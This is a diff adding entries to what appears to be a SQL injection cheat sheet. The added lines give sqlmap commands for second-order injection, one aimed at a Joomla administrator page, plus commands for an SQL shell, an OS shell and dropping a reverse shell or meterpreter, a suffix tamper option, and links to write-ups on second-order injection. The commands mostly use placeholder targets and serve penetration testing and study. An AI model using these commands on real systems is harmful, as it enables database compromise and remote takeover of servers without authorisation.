@@ -37,6 +37,29 @@ python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  
 The injection is located at the '*'
 ```
 
+Second order injection
+```
+python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
+```
+
+Shell
+```
+SQL Shell
+python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
+
+Simple Shell
+python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
+
+Dropping a reverse-shell / meterpreter
+python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+```
+
+Using suffix to tamper the injection
+```
+python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+```
+
 General tamper option and tamper's list
 ```
 tamper=name_of_the_tamper
@@ -328,3 +351,8 @@ mysql> mysql> select version();
   - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
   - [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
   - [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
+* Second Order:
+  - [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
+  - [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
+* Sqlmap:
+  - [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
